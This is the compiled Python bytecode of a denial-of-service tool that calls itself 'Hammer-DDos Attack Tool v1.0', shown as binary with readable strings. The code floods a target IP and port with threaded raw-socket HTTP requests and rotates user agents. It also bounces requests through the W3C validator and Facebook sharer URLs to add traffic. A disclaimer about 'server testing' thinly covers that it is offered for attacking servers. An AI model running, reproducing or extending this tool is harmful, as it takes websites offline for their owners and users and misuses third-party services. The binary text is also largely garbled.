ó
7éÀ`c           @   sÆ  d  d l  m Z d  d l m Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z
 d  d l Z d   Z d   Z d   Z d   Z d   Z d	   Z d
   Z d   Z e d d  Z e j   a e j   e   Z e   Z e d k rÂe e j  d k  re   n  e   d t d e t   d e t!  d f GHd GHe   e   e j" d  yB e j e j# e j$  Z% e% j& t e' t   f  e% j( d  Wn" e j) k
 rÑZ* d GHe   n Xxí e+ r¾xd e, e' t!   D]P Z- e j. d e  Z/ e+ e/ _0 e/ j1   e j. d e  Z2 e+ e2 _0 e2 j1   qîWe j   Z1 d a3 xP e+ r¦t3 d k rd a3 e j" d  n  t3 d a3 e j4 t3  e j4 t3  qWWe j5   e j5   qÕWn  d S(   iÿÿÿÿ(   t   Queue(   t   OptionParserNc           C   se   g  a  t  j d  t  j d  t  j d  t  j d  t  j d  t  j d  t  j d  t  S(   Ns>   Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14sJ   Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0sR   Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3sj   Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)sy   Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7sm   Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)sX   Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1(   t   uagentt   append(    (    (    s*   /storage/emulated/0/Movies/ragrtny_site.pyt
   user_agent   s    c           C   s$   g  a  t  j d  t  j d  t  S(   Ns"   http://validator.w3.org/check?uri=s,   http://www.facebook.com/sharer/sharer.php?u=(   t   botsR   (    (    (    s*   /storage/emulated/0/Movies/ragrtny_site.pyt   my_bots   s    c         C   sr   yW xP t  rU t j j t j j |  d i t j t  d 6 } d GHt j	 d  q WWn t j	 d  n Xd  S(   Nt   headerss
   User-Agents   [94mbot is hammering...[0mg¹?(
   t   Truet   urllibt   requestt   urlopent   Requestt   randomt   choiceR   t   timet   sleep(   t   urlt   req(    (    s*   /storage/emulated/0/Movies/ragrtny_site.pyt   bot_hammering    s    	4c         C   s  yÞ x× t  rÜ t d t d t j t  d t  j d  } t j t j	 t j
  } | j t t t  f  | j | t t t  f  rº | j d  d t j t j    d f GHn | j d  d GHt j d	  q WWn( t j k
 r} d
 GHt j d	  n Xd  S(   Ns   GET / HTTP/1.1
Host: s   

 User-Agent: s   
s   utf-8i   s   [92ms,   [0m [94m <--packet sent! hammering--> [0ms   [91mshut<->down[0mg¹?s)   [91mno connection! server maybe down[0m(   R   t   strt   hostR   R   R   t   datat   encodet   sockett   AF_INETt   SOCK_STREAMt   connectt   intt   portt   sendtot   shutdownR   t   ctimeR   t   error(   t   itemt   packett   st   e(    (    s*   /storage/emulated/0/Movies/ragrtny_site.pyt   down_it*   s    	2 c          C   s1   x* t  r, t j   }  t |   t j   q Wd  S(   N(   R   t   qt   getR&   t	   task_done(   R"   (    (    s*   /storage/emulated/0/Movies/ragrtny_site.pyt   dos=   s    	
c          C   sB   x; t  r= t j   }  t t j t  d t  t j   q Wd  S(   Ns   http://(	   R   t   wR(   R   R   R   R   R   R)   (   R"   (    (    s*   /storage/emulated/0/Movies/ragrtny_site.pyt   dos2D   s    	c           C   s   d GHt  j   d  S(   Ns   [92m	Hammer-DDos Attack Tool v1.0
	It is the end user's responsibility to obey all applicable laws.
	It is just for server testing script. Your ip is visible. 

	usage : python3 hammer.py [-s] [-p] [-t]
	-h : help
	-s : server ip
	-p : port default 80
	-t : turbo default 135 [0m(   t   syst   exit(    (    (    s*   /storage/emulated/0/Movies/ragrtny_site.pyt   usageK   s    c          C   sq  t  d t d d  }  |  j d d d d d d	 d
 d d t j d t j |  j d d d
 d d d |  j d d d d d
 d d d |  j d d d d d
 d d d |  j d d d
 d d d d d |  j   \ } } t j d  | j d! d"  | j	 r	t
   n  | j d  k	 r$| j a n t
   | j d  k rCd# a n	 | j a | j d  k rdd$ a n	 | j a d  S(%   Nt   add_help_optiont   epilogt   Hammerss   -qs   --quiett   helps   set logging to ERRORt   actiont   store_constt   destt   loglevelt   constt   defaults   -ss   --serverR   s   attack to server ip -s ips   -ps   --portt   typeR   R   s   -p 80 default 80s   -ts   --turbot   turbos   default 135 -t 135s   -hs   --helpt
   store_trues   help yout   levelt   formats   %(levelname)-8s %(message)siP   i   (   R   t   Falset
   add_optiont   loggingt   ERRORt   INFOt
   parse_argst   basicConfigR7   R3   R/   R   t   NoneR   R;   t   thr(   t   optpt   optst   args(    (    s*   /storage/emulated/0/Movies/ragrtny_site.pyt   get_parametersW   s&    4"""	
			s   headers.txtt   rt   __main__i   s   [92ms    port: s    turbo: s   [0ms   [94mPlease wait...[0mi   i   s!   [91mcheck server ip and port[0mt   targeti    i  g¹?(6   t   queueR    t   optparseR   R   R-   R   t	   threadingRA   t   urllib.requestR	   R   R   R   R   R&   R*   R,   R/   RK   t   openR   t   readR   t   closeR'   R+   t   __name__t   lent   argvR   R   R   RG   R   R   R   R$   R   R   t
   settimeoutR!   R%   R   t   ranget   it   Threadt   tt   daemont   startt   t2R"   t   putt   join(    (    (    s*   /storage/emulated/0/Movies/ragrtny_site.pyt   <module>   sd   T			
					
		
&		
		

